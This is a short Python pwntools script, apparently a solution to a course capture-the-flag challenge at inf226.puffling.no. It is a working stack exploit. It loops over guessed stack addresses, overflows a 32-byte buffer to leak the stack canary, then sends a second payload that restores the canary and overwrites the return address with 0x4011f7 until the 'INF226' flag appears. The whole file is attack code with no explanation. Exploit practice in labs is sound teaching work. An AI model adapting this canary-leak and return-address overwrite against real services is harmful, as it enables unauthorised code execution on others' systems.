from pwn import *

context.log_level = "debug"

for i in range (0x7ffffffff000,0x7fffffffb000 , -0x4):
    io = remote('inf226.puffling.no', 7003)

    

    try:
        io.recvuntil(b'What is your favourite pancake recipe? (Finish with an empty line)\n1. ') 

        payload = b'A' * 32
        payload += p64(i)
        io.sendline(payload)

        canary = p64(int(io.recvuntil(b'. ').decode().split('.')[0],16))

        payload = b'A' * 32
        payload += p64(i)
        payload += canary
        payload += b'A' * 8
        payload += p64(0x4011f7)
        io.sendline(payload)
        
        io.sendline()
       
        output = str(io.readall(timeout=.5))
        if 'INF226' in output:
            print(i)
            break

        io.close()


    except Exception as e:
        io.close()
 
